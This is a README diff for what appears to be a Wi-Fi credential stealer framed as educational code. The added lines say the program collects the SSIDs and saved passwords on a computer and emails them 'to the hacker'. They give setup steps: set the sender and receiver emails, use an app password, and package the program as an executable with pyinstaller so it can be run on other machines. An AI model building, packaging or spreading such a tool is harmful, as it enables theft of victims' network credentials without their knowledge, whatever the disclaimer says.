@@ -6,3 +6,5 @@ This code is intended for educational purposes only. It is designed to help indi
 ## Usage
 Please use this code responsibly and only in environments where you have explicit permission to test and explore cybersecurity concepts.
 
+The program takes the wifie SSID and passwords stored on a computer and sends it to the hacker. don't forget to replace your email with sender and receiver email in the program. for security reasons use app password instead of actual email password. 
+you use pyinstaller to wrap up the program and its dependencies into an executable file. 
